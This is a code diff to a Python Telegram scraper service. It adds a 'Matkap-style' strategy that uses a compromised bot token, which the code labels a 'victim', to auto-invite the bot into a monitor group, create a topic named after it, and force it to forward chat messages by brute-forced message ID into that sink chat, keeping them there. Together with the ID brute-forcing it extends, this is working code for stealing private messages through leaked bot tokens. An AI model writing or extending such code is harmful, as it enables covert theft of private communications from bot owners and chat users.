@@ -53,7 +53,7 @@ class ScraperService:
         except Exception as e:
             print(f"    [Scraper] Bot API fallback failed: {e}")
 
-        # Strategy 2: Blind ID Bruteforce (Telethon GetMessages)
+        # Strategy 3: Blind ID Bruteforce (Telethon GetMessages)
         # If we found an anchor, we can look backwards!
         if anchor_id > 0:
             try:
@@ -67,7 +67,140 @@ class ScraperService:
             except Exception as e:
                 print(f"❌ [Scraper] Bruteforce failed: {e}")
 
+        # Strategy 4: Blind Forwarding (Matkap Style)
+        # Extremely powerful but invasive. Use if brute force yielded nothing.
+        if len(scraped_messages) == 0 and anchor_id > 0:
+             try:
+                # We need a destination. Use MONITOR_GROUP_ID if set.
+                dest_chat_id = settings.MONITOR_GROUP_ID
+                if dest_chat_id:
+                     print(f"🚀 [Scraper] Engaging Matkap-Style Forwarding (Target: {dest_chat_id})...")
+                     
+                     # AUTO-INVITE: Use User Agent to add bot to group
+                     try:
+                         from app.services.user_agent_srv import user_agent
+                         # We need the username. We might have it from earlier or need to fetch it.
+                         # We can try to get it from cache or just rely on what we know.
+                         # If we don't have the username, we can't invite easily by username.
+                         # But wait, we have the BOT TOKEN. We can get its username!
+                         import requests
+                         me_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5).json()
+                         if me_res.get("ok"):
+                             victim_username = me_res["result"]["username"]
+                             print(f"    [Scraper] Auto-inviting @{victim_username} to monitor group...")
+                             await user_agent.invite_bot_to_group(victim_username, dest_chat_id)
+                     except Exception as e_invite:
+                         print(f"    ⚠️ [Scraper] Auto-invite failed (skipping): {e_invite}")
+
+                     fwd_msgs = self._scrape_via_forwarding(bot_token, chat_id, dest_chat_id, anchor_id, limit=20)
+                     for m in fwd_msgs:
+                        if m['telegram_msg_id'] not in unique_ids:
+                            scraped_messages.append(m)
+                            unique_ids.add(m['telegram_msg_id'])
+                     print(f"✨ [Scraper] Forwarding added {len(fwd_msgs)} messages.")
+             except Exception as e:
+                 print(f"❌ [Scraper] Forwarding failed: {e}")
+
         return scraped_messages
+
+    def _create_forum_topic(self, bot_token: str, chat_id: int, name: str) -> int:
+        """Helper to create a forum topic using a bot."""
+        import requests
+        try:
+            url = f"https://api.telegram.org/bot{bot_token}/createForumTopic"
+            res = requests.post(url, json={"chat_id": chat_id, "name": name}, timeout=10)
+            if res.status_code == 200 and res.json().get("ok"):
+                return res.json()["result"]["message_thread_id"]
+        except Exception as e:
+            print(f"    ⚠️ Topic create failed: {e}")
+        return 0
+
+    def _scrape_via_forwarding(self, bot_token: str, from_chat_id: int, to_chat_id: int, start_id: int, limit: int) -> List[Dict]:
+        """
+        Matkap-style: Forces bot to forward messages to a sink chat (Forum Topic).
+        1. Creates a topic: '💀 @bot_username'
+        2. Forwards messages there.
+        3. KEEPS them there (no delete).
+        """
+        import requests
+        import time
+        from app.core.config import settings
+        
+        msgs = []
+        base_url = f"https://api.telegram.org/bot{bot_token}"
+
+        # 0. Get Bot Info for Topic Name
+        bot_username = "unknown_bot"
+        try:
+            me = requests.get(f"{base_url}/getMe", timeout=5).json()
+            if me.get("ok"):
+                bot_username = me["result"].get("username", "unknown")
+        except: pass
+
+        # 1. Create Topic (using Hunter Bot)
+        # We need the MONITOR_BOT_TOKEN to create the topic comfortably, 
+        # but the compromised bot MIGHT be admin? Unlikely. 
+        # We use the configured MONITOR_BOT_TOKEN for admin actions if available.
+        target_thread_id = 0
+        if settings.MONITOR_BOT_TOKEN:
+            topic_name = f"💀 @{bot_username}"
+            print(f"    [Scraper] Creating topic '{topic_name}'...")
+            target_thread_id = self._create_forum_topic(settings.MONITOR_BOT_TOKEN, to_chat_id, topic_name)
+        
+        if not target_thread_id:
+             print("    [Scraper] Could not create topic (check permissions/forum mode). Forwarding to 'General'...")
+
+        # Scan backwards from start_id
+        for msg_id in range(start_id, max(0, start_id - limit), -1):
+            try:
+                # 2. Forward
+                payload = {
+                    "chat_id": to_chat_id,
+                    "from_chat_id": from_chat_id,
+                    "message_id": msg_id
+                }
+                if target_thread_id:
+                    payload["message_thread_id"] = target_thread_id
+
+                res = requests.post(f"{base_url}/forwardMessage", json=payload, timeout=5)
+                
+                if res.status_code == 200:
+                    data = res.json()
+                    if data.get("ok"):
+                        result = data["result"]
+                        
+                        # Parse Content
+                        content = result.get('text') or result.get('caption') or ""
+                        
+                        media_type = "text"
+                        file_meta = {}
+                        if 'photo' in result: media_type = 'photo'
+                        elif 'document' in result: media_type = 'document'
+                        
+                        original_sender = "Unknown"
+                        if 'forward_from' in result:
+                            original_sender = result['forward_from'].get('username') or result['forward_from'].get('first_name')
+                        
+                        msgs.append({
+                            "telegram_msg_id": msg_id,
+                            "sender_name": original_sender,
+                            "content": content,
+                            "media_type": media_type,
+                            "file_meta": file_meta,
+                            "chat_id": from_chat_id
+                        })
+                        
+                        # 3. NO DELETE - User wants to keep them!
+                        
+                        time.sleep(0.2) # Rate limit safety
+                        
+                elif res.status_code == 429:
+                    print("    Rate limit hit, sleeping...")
+                    time.sleep(2)
+            except Exception:
+                pass
+                
+        return msgs
 
     async def _scrape_via_id_bruteforce(self, bot_token: str, chat_id: int, start_id: int, limit: int) -> List[Dict]:
         """
